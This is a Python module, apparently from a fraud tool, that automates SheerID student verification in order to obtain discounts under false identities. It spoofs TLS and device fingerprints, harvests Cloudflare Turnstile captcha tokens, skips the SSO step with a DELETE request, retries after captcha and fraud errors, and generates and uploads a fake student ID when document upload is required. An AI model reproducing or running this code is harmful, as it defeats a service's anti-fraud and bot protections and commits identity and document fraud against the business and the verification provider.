"""
SheerID API Integration Module
Core verification logic with TLS Spoofing, Session Warming, and Zero-Cost Turnstile Harvester Integration
"""
import sys
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass

import re
import json
import time
import base64
from urllib.parse import urlparse, parse_qs
from curl_cffi import requests
import anti_detect

class SheerIDClient:
    def __init__(self, proxy=None):
        self.proxy = proxy
        self.session, _, _ = anti_detect.create_session(proxy=proxy)
        self.base_url = "https://services.sheerid.com/rest/v2"

    def _headers(self, for_sheerid=True):
        """Get headers consistent with this session's client profile"""
        profile = getattr(self.session, "profile", None)
        return anti_detect.get_headers(for_sheerid=for_sheerid, profile=profile)

    def extract_verification_id_from_url(self, url):
        """Extracts verificationId or ProgramId from a SheerID URL"""
        match = re.search(r'verificationId=([a-zA-Z0-9]{24})', url)
        if match:
             return match.group(1), False # (ID, IsProgramID)
             
        match = re.search(r'/verify/([a-zA-Z0-9]{24})', url)
        if match:
            return match.group(1), True # Assume Program ID if not in query
            
        return None, False

    def start_verification(self, program_id):
        """Creates a new verification session for a program"""
        print(f"[*] Initializing new verification session for program {program_id}...")
        url = f"{self.base_url}/verification/program/{program_id}"
        payload = {
            "metadata": {
                "locale": "en-US",
                "marketConsentValue": False
            }
        }
        try:
            resp = self.session.post(url, json=payload, headers=self._headers())
            data = resp.json()
            vid = data.get("verificationId")
            if vid:
                print(f"[*] New Verification ID created: {vid}")
                return vid
            else:
                print(f"[!] Failed to create session: {data}")
                return None
        except Exception as e:
            print(f"[!] Error starting verification: {e}")
            return None

    def get_verification_details(self, verification_id):
        """Get current status of verification"""
        url = f"{self.base_url}/verification/{verification_id}"
        resp = self.session.get(url, headers=self._headers())
        if resp.status_code != 200:
            print(f"[!] Error getting details ({resp.status_code}): {resp.text}")
        return resp.json()

    def submit_student_info(self, verification_id, student_data, captcha_token=None):
        """Step 1: Submit personal info (With Advanced Metadata & Turnstile Support)"""
        url = f"{self.base_url}/verification/{verification_id}/step/collectStudentPersonalInfo"
        
        payload = {
            "firstName": student_data["firstName"],
            "lastName": student_data["lastName"],
            "birthDate": student_data["birthDate"],
            "email": student_data["email"],
            "phoneNumber": "",
            "organization": {
                "id": student_data["organization"]["id"],
                "idExtended": str(student_data["organization"]["id"]),
                "name": student_data["organization"]["name"]
            },
            "deviceFingerprintHash": anti_detect.get_fingerprint(),
            "locale": "en-US",
            "metadata": {
                "marketConsentValue": False,
                "verificationId": verification_id,
                "refererUrl": f"https://services.sheerid.com/verify/67c8c14f5f17a83b745e3f82/?verificationId={verification_id}",
                "flags": '{"collect-info-step-email-first":"default","doc-upload-considerations":"default","doc-upload-may24":"default","doc-upload-redesign-use-legacy-message-keys":false,"docUpload-assertion-checklist":"default","font-size":"default","include-cvec-field-france-student":"not-labeled-optional"}',
                "submissionOptIn": "By submitting the personal information above, I acknowledge that my personal information is being collected under the privacy policy of the business from which I am seeking a discount"
            }
        }
        
        # Inject Turnstile / Captcha token if provided
        if captcha_token:
            payload["captchaToken"] = captcha_token
            payload["turnstileToken"] = captcha_token
            payload["metadata"]["captchaToken"] = captcha_token

        headers = self._headers()
        headers["Referer"] = f"https://services.sheerid.com/verify/67c8c14f5f17a83b745e3f82/?verificationId={verification_id}"
        headers["Origin"] = "https://services.sheerid.com"
        
        resp = self.session.post(
            url, 
            json=payload, 
            headers=headers
        )
        if resp.status_code != 200:
            print(f"[!] Submit Info Response ({resp.status_code}): {resp.text}")
            
        return resp.json()

    def skip_sso(self, verification_id):
        """Step 3 (Optional): Bypass SSO Step"""
        url = f"{self.base_url}/verification/{verification_id}/step/sso"
        print(f"[*] Attempting SSO Bypass for {verification_id}...")
        try:
             resp = self.session.delete(url, headers=self._headers())
             return resp.json()
        except:
             return {"currentStep": "sso_skip_failed"}

    def upload_document(self, verification_id, doc_bytes, doc_type="student_id"):
        """Step 2: Upload document if required"""
        url = f"{self.base_url}/verification/{verification_id}/step/docUpload"
        
        # 1. Initiate upload to get URL
        mime = "image/jpeg"
        init_payload = {
            "files": [
                {"fileName": "student_card.jpg", "mimeType": mime, "fileSize": len(doc_bytes)}
            ]
        }
        headers = self._headers()
        headers["Referer"] = f"https://services.sheerid.com/verify/67c8c14f5f17a83b745e3f82/?verificationId={verification_id}"
        
        resp = self.session.post(url, json=init_payload, headers=headers)
        data = resp.json()
        
        if not data.get("documents"):
            return {"status": "UPLOAD_INIT_FAILED", "details": data}
            
        upload_url = data["documents"][0]["uploadUrl"]
        
        # 2. Put to S3 (no sheerid headers here)
        s3_headers = {"Content-Type": mime}
        self.session.put(upload_url, data=doc_bytes, headers=s3_headers)
        
        # 3. Complete
        anti_detect.random_delay(1000, 2000)
        complete_url = f"{self.base_url}/verification/{verification_id}/step/completeDocUpload"
        final_resp = self.session.post(complete_url, headers=self._headers())
        
        return final_resp.json()

    def check_status(self, verification_id, max_polling=20):
        """Poll for final status with extended timeout"""
        print(f"[*] Polling status for {verification_id}...")
        details = {}
        
        for i in range(max_polling):
            try:
                details = self.get_verification_details(verification_id)
                step = details.get("currentStep")
                
                print(f"    [{i+1}/{max_polling}] Status: {step}")
                
                if step == "success":
                    reward = details.get("rewardCode")
                    redirect_url = details.get("redirectUrl")
                    if not redirect_url and details.get("metadata"):
                        redirect_url = details.get("metadata").get("redirectUrl")
                        
                    return {
                        "status": "SUCCESS", 
                        "reward_code": reward,
                        "redirect_url": redirect_url,
                        "full_details": details
                    }
                    
                elif step == "error" or details.get("errorIds"):
                     errors = details.get("errorIds", [])
                     if "fraudRulesReject" in errors:
                         return {"status": "FRAUD_REJECT", "errors": errors}
                     return {"status": "FAILED", "reason": errors}
                
                elif step == "docUpload":
                     return {"status": "DOC_UPLOAD_REQUIRED", "details": details}
                     
                elif step == "sso":
                     # If stuck on SSO, try to skip again
                     self.skip_sso(verification_id)
                     
                time.sleep(2)
            except Exception:
                time.sleep(2)
            
        return {"status": "TIMEOUT", "last_details": details}

    def process_verification(self, input_id, is_program_id, student_data, doc_generator_func=None, raw_url=None):
        """Full automated flow with Deep Bypass, Zero-Cost Turnstile Harvester & Session Extraction"""
        program_id = "67c8c14f5f17a83b745e3f82"  # Default Gemini
        import turnstile_solver
        
        captcha_token = None
        verification_id = input_id
        
        # If the URL is an initial link (no verificationId in query params, or is_program_id is True)
        if is_program_id or input_id == program_id:
            print("[*] Link does not have an active verificationId session. Auto-resolving session via stealth browser...")
            target_to_open = raw_url if raw_url else f"https://services.sheerid.com/verify/{program_id}/"
            captcha_token, resolved_vid = turnstile_solver.solve_sheerid_turnstile(
                target_to_open,
                program_id=program_id,
                proxy=self.proxy
            )
            if resolved_vid and resolved_vid != program_id:
                verification_id = resolved_vid
                print(f"[+] Successfully extracted active verificationId: {verification_id}")
            else:
                print(f"[!] Warning: Could not extract real session verificationId from browser.")
        else:
            verification_id = input_id

        print(f"[*] VERIFICATION SESSION INITIATED: {verification_id}")
        
        # Session Warming with SheerID and Cloudflare
        anti_detect.warm_session(self.session, program_id=program_id, verification_id=verification_id)
        anti_detect.random_delay(1500, 2500)

        # Check current status
        details = self.get_verification_details(verification_id)
        current_step = details.get("currentStep") if isinstance(details, dict) else None
        print(f"[*] Initial status from API: {current_step}")

        result = details if isinstance(details, dict) else {}

        # Submit Info if required
        if current_step == "collectStudentPersonalInfo" or not current_step:
            full_name = student_data.get("display_info", {}).get("full_name") or f"{student_data.get('firstName', '')} {student_data.get('lastName', '')}"
            print(f"[*] Submitting Payload: {full_name}")
            
            # If we don't have a token yet, harvest it now to avoid failing first
            if not captcha_token:
                target_to_open = raw_url if raw_url else f"https://services.sheerid.com/verify/{program_id}/?verificationId={verification_id}"
                captcha_token, _ = turnstile_solver.solve_sheerid_turnstile(
                    target_to_open,
                    program_id=program_id,
                    proxy=self.proxy
                )
            
            result = self.submit_student_info(verification_id, student_data, captcha_token=captcha_token)
            
            # Check for submission errors (e.g. invalidCaptchaToken, fraudRulesReject)
            if isinstance(result, dict) and result.get("errorIds"):
                errors = result.get("errorIds", [])
                
                # Zero-cost Cloudflare Turnstile Resolution retry
                if any(err in ("invalidCaptchaToken", "captchaRequired") for err in errors):
                    print("[!] Captcha retry requested. Harvesting fresh token...")
                    try:
                        fresh_token, _ = turnstile_solver.solve_sheerid_turnstile(
                            raw_url or verification_id,
                            program_id=program_id,
                            proxy=self.proxy
                        )
                        if fresh_token:
                            print("[+] Fresh Turnstile Token acquired! Re-submitting payload...")
                            result = self.submit_student_info(verification_id, student_data, captcha_token=fresh_token)
                            errors = result.get("errorIds", []) if isinstance(result, dict) else []
                    except Exception as e:
                        print(f"[!] Error in local turnstile harvester: {e}")

                if errors:
                    print(f"[!] Submission Error: {errors}")
                    return {"status": "FAILED", "errors": errors, "reason": errors}

            current_step = result.get("currentStep") if isinstance(result, dict) else None
            
            # Handle Instant Error
            if current_step == "error" or not current_step:
                print("[!] Step 1 returned error. Checking actual state...")
                details = self.get_verification_details(verification_id)
                current_step = details.get("currentStep") if isinstance(details, dict) else None
                print(f"[*] Current status from API: {current_step}")
                if isinstance(details, dict) and details.get("errorIds"):
                    return {"status": "FAILED", "errors": details.get("errorIds"), "reason": details.get("errorIds")}
        
        # 2. Skip SSO if prompted
        if current_step == "sso":
            print("[*] SSO Step detected. Bypassing...")
            result = self.skip_sso(verification_id)
            current_step = result.get("currentStep") if isinstance(result, dict) else None
            print(f"[*] Step 2 (SSO Bypass) Result: {current_step}")
        
        if current_step == "success":
            return self.check_status(verification_id)
            
        elif current_step == "docUpload":
            print("[*] Document upload required. Generating fake doc...")
            if doc_generator_func:
                doc_bytes = doc_generator_func(
                    student_data["firstName"],
                    student_data["lastName"],
                    student_data["organization"]["name"]
                )
                
                print("[*] Uploading document...")
                upload_res = self.upload_document(verification_id, doc_bytes)
                print(f"[*] Upload completed: {upload_res}")
                
                return self.check_status(verification_id)
            else:
                return {"status": "DOC_REQUIRED_NO_GENERATOR"}
                 
        elif current_step == "reject" or current_step == "error": 
            error_ids = result.get("errorIds") if isinstance(result, dict) else details.get("errorIds", [])
            return {"status": "REJECTED", "errors": error_ids, "reason": error_ids}
             
        return self.check_status(verification_id)
